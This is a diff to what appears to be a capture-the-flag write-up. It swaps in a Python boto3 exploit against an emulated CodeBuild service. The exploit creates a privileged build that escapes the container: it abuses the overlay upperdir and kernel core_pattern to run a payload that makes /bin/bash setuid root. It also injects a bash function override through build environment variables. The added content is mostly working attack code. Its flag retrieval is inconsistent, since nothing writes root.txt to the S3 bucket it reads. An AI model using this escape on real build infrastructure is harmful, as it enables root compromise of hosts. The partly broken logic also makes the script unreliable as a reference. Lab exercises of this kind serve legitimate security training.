@@ -519,28 +519,56 @@ worker@a147090e066a:~$
 
 ``` python3
 
-cat > exploit_root.py << 'EOF'
-
-import boto3
-
-cb = boto3.client("codebuild", endpoint_url="http://172.18.0.2:4566", region_name="us-east-1")
-
-cb.create_project(
-    name="poc",
-    source={"type": "NO_SOURCE", "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n      - ls /\n      - cat /root/root.txt 2>&1 || echo 'no access'\n      - mount | grep -i overlay"},
-    artifacts={"type": "NO_ARTIFACTS"},
-    environment={
-        "type": "LINUX_CONTAINER",
-        "image": "amazonlinux",
-        "computeType": "BUILD_GENERAL1_SMALL",
-        "privilegedMode": True,
-    },
-    serviceRole="arn:aws:iam::847219365028:role/codebuild-role",
+import boto3, time
+cb = boto3.client("codebuild", endpoint_url="http://floci:4566", region_name="us-east-1")
+s3 = boto3.client("s3", endpoint_url="http://floci:4566", region_name="us-east-1")
+BUCKET = "loot"
+try:
+    s3.create_bucket(Bucket=BUCKET)
+except Exception:
+    pass
+buildspec = """version: 0.2
+phases:
+  build:
+    commands:
+      - id
+      - echo "#!/bin/sh" > /tmp/p.sh
+      - echo "chmod u+s /bin/bash" >> /tmp/p.sh
+      - chmod +x /tmp/p.sh
+      - upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
+      - cp /tmp/p.sh "$upper/tmp/p.sh"
+      - echo "|/tmp/p.sh" > /proc/sys/kernel/core_pattern
+      - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
+"""
+try:
+    cb.create_project(
+        name="nimbus-simple",
+        source={"type": "NO_SOURCE", "buildspec": buildspec},
+        artifacts={"type": "NO_ARTIFACTS"},
+        environment={
+            "type": "LINUX_CONTAINER",
+            "image": "floci/floci:latest",
+            "computeType": "BUILD_GENERAL1_SMALL",
+            "privilegedMode": True,
+        },
+        serviceRole="arn:aws:iam::847219365028:role/codebuild-role",
+    )
+except Exception as e:
+    print("create_project:", e)
+resp = cb.start_build(
+    projectName="nimbus-simple",
+    environmentVariablesOverride=[
+        {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
+    ],
 )
+print("started:", resp["build"]["id"])
+time.sleep(15)
+# lee directamente el flag desde S3, sin listener
+try:
+    obj = s3.get_object(Bucket=BUCKET, Key="root.txt")
+    print("ROOT.TXT:", obj["Body"].read().decode())
+except Exception as e:
+    print("aún no disponible o error:", e)
 
-resp = cb.start_build(projectName="poc")
-print(resp["build"]["id"])
-EOF
-
-
+```
 
